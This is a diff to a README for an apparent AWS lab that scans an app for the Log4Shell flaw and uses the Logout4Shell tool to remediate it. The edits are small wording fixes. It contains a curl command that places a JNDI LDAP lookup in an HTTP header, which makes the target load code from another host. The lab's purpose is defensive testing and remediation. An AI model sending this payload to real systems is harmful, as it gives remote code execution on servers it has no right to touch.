@@ -111,7 +111,7 @@ Also make sure this container isn't publicly accessible.
 1. In the AWS Management Console adjust the security group for the Logout4Shell Container to allow inbound connection from the IP address of the Vulnerable App on ports 1389 and 8888.
 
 ## How it works
-1. Let's first vaildate that the Vulnernable app is indeed vulnerable. From the FullHunt log4j scan terminal window, execute the command below replacing ```<Vulnerable_App_IP_Address>``` with the IP address of the Vulnerable app instance.
+1. Let's first vaildate that the Vulnerable app is indeed vulnerable. From the FullHunt log4j scan terminal window, execute the command below replacing ```<Vulnerable_App_IP_Address>``` with the IP address of the Vulnerable app instance.
 ```
 sudo docker run -it --rm log4j-scan -u http://<Vulnerable_App_IP_Address>:443
 ```
@@ -119,9 +119,9 @@ sudo docker run -it --rm log4j-scan -u http://<Vulnerable_App_IP_Address>:443
 ```
 [!!!] Target Affected
 ```
-2. To vaccinate the Vulnerable app run the command below from the Logout4Shell Container terminal window replacing ```<Vulnerable_App_IP_Address>``` with the IP address of the Vulnerable app instance and ```<Logout4Shell_Container_IP_address>``` with the IP address of the Logout4Shell Container instance.
+2. To vaccinate the Vulnerable app run the command below from the Logout4Shell Container terminal window replacing ```<Vulnerable_App_IP_Address>``` with the IP address of the Vulnerable app instance and ```<Logout4Shell_Container_IP_Address>``` with the IP address of the Logout4Shell Container instance:
 ```
-curl <Vulnerable_App_IP_Address>:443 -H 'X-Api-Version: ${jndi:ldap://<Logout4Shell_Container_IP_address>:1389/a}'
+curl <Vulnerable_App_IP_Address>:443 -H 'X-Api-Version: ${jndi:ldap://<Logout4Shell_Container_IP_Address>:1389/a}'
 ```
 - After a few seconds you should receive a similar response in the Vulnerable app terminal window:
 ```
@@ -131,7 +131,7 @@ HelloWorld                               : Received a request for API version ${
 ```
 Setting FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS value to True
 ````
-3. Run the FullHunt log4j scan again and you should receive the output below validating the log4j vulnerability has been remediated.
+3. Run the FullHunt log4j scan again and you should receive the output below validating the log4j vulnerability has been remediated:
 ```
 [•] Targets do not seem to be vulnerable.
 ```
